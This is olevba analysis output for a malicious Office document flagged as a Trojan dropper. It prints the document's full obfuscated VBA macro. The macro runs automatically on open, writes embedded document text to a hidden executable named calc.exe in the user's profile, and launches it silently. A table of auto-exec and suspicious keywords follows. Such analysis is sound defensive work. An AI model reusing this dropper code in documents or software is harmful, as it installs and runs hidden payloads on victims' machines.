olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan-Dropper.MSExcel.Agent.bj-2deb003f7297cb6b40320e38aae81f62e338512bdf0acb27fb3ccdf7386b16aa
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()
    Pvtzd12
End Sub

Sub Pvtzd12()
    Dim Pvtzd7 As Integer
    Dim Pvtzd1 As String
    Dim Pvtzd2 As String
    Dim Pvtzd3 As Integer
    Dim Pvtzd4 As Paragraph
    Dim Pvtzd8 As Integer
    Dim Pvtzd9 As Boolean
    Dim Pvtzd5 As Integer
    Dim Pvtzd11 As String
    Dim Pvtzd6 As Byte
    Dim Szhpkmtzka As String
    Szhpkmtzka = "Szhpkmtzka"
    Pvtzd1 = "calc.exe"
    Pvtzd2 = Environ("USERPROFILE")
    ChDrive (Pvtzd2)
    ChDir (Pvtzd2)
    Pvtzd3 = FreeFile()
    Open Pvtzd1 For Binary As Pvtzd3
    For Each Pvtzd4 In ActiveDocument.Paragraphs
        DoEvents
            Pvtzd11 = Pvtzd4.Range.Text
        If (Pvtzd9 = True) Then
            Pvtzd8 = 1
            While (Pvtzd8 < Len(Pvtzd11))
                Pvtzd6 = Mid(Pvtzd11, Pvtzd8, 4)
                Put #Pvtzd3, , Pvtzd6
                Pvtzd8 = Pvtzd8 + 4
            Wend
        ElseIf (InStr(1, Pvtzd11, Szhpkmtzka) > 0 And Len(Pvtzd11) > 0) Then
            Pvtzd9 = True
        End If
    Next
    Close #Pvtzd3
    Pvtzd13 (Pvtzd1)
End Sub

Sub Pvtzd13(Pvtzd10 As String)
    Dim Pvtzd7 As Integer
    Dim Pvtzd2 As String
    Pvtzd2 = Environ("USERPROFILE")
    ChDrive (Pvtzd2)
    ChDir (Pvtzd2)
    Pvtzd7 = Shell(Pvtzd10, vbHide)
End Sub

Sub AutoOpen()
    Auto_Open
End Sub

Sub Workbook_Open()
    Auto_Open
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|IOC       |calc.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

